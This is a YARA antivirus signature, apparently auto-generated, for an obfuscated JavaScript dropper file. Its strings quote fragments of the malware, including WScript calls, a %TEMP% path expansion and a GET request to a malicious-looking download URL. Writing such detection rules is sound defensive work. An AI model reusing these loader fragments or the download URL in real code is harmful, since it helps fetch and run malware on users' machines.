rule sig_20160428_0f98adff3d296ac780d7e9c7a4e02642 {
  meta:
    description = "datamaliciousorder - file 20160428_0f98adff3d296ac780d7e9c7a4e02642.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "95dd6072e355170ebe8f44dcf887615ecc91c8ee1c46a153ac7ed3c22855bc58"

  strings:
    $s1  = "function JvhLxgFybZmmEroOtwJvn(KfuYbfSmsYztCoiZdfMyj){AreCglBthFfiRzmRwfStk[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function JvhLxgFybZmmEroOtwJvn(KfuYbfSmsYztCoiZdfMyj){AreCglBthFfiRzmRwfStk[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function UtdIgsImqUsdCtoIevSce() {return AreCglBthFfiRzmRwfStk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function OndGiiCinTjlXedMahBvo(WrwWajQthPerPdyEtlQkd, GdqXkgJqjYmzHvaGbmNxj){JjwQgiVwfUvdDwaKmiLwl = JjwQgiVwfUvdDwaKmiLwl * 1; " ascii
    $s5  = "var AreCglBthFfiRzmRwfStk = function JkwGdqIlwFkmAyxRthYgj() {return IzuTghKyjMypCmrCzyClj[KvrGaeZjwIdlAxgIomZzm](\"WScript\"+\"" ascii
    $s6  = "return WrwWajQthPerPdyEtlQkd - GdqXkgJqjYmzHvaGbmNxj;};" fullword ascii
    $s7  = "GfvTynJzlVtcOalKjtEbv[HhpYclFikIqwQiqSicHrr](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s8  = "var IzuTghKyjMypCmrCzyClj = this[\"WScript\"];" fullword ascii
    $s9  = "var AreCglBthFfiRzmRwfStk = function JkwGdqIlwFkmAyxRthYgj() {return IzuTghKyjMypCmrCzyClj[KvrGaeZjwIdlAxgIomZzm](\"WScript\"+\"" ascii
    $s10 = "function TloGlbJumCpzBlzJyzLtt(){return KvrGaeZjwIdlAxgIomZzm;};" fullword ascii
    $s11 = "function UtdIgsImqUsdCtoIevSce() {return AreCglBthFfiRzmRwfStk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s12 = "if (GfvTynJzlVtcOalKjtEbv[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function ZkfXqwZcqLgeEhiSfsWyy(){return CsmGpxAxgTacDzsLgmPjz + \"\";};" fullword ascii
    $s14 = "function OndGiiCinTjlXedMahBvo(WrwWajQthPerPdyEtlQkd, GdqXkgJqjYmzHvaGbmNxj){JjwQgiVwfUvdDwaKmiLwl = JjwQgiVwfUvdDwaKmiLwl * 1; " ascii
    $s15 = "function FecLriToaKbwLodSltLlw() {return ((YadCojXfqEwfExoLjwSsi == true) && (YadCojXfqEwfExoLjwSsi == AjrQzsBqlCpnNwxRoiMhx)) ?" ascii
    $s16 = "function FecLriToaKbwLodSltLlw() {return ((YadCojXfqEwfExoLjwSsi == true) && (YadCojXfqEwfExoLjwSsi == AjrQzsBqlCpnNwxRoiMhx)) ?" ascii
    $s17 = "HimGmtTvwAtnWfsPevGzx = true;" fullword ascii
    $s18 = "function DuoTqxExjYysJhfInjWjg()" fullword ascii
    $s19 = "var HimGmtTvwAtnWfsPevGzx = false;" fullword ascii
    $s20 = "return OndGiiCinTjlXedMahBvo(1 == 1 ? CwgCpvSnoIxeLxjQpxSbq : 0, 1 == 1 ? GuxTwjChiGzaSljWxtFjj : 0);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}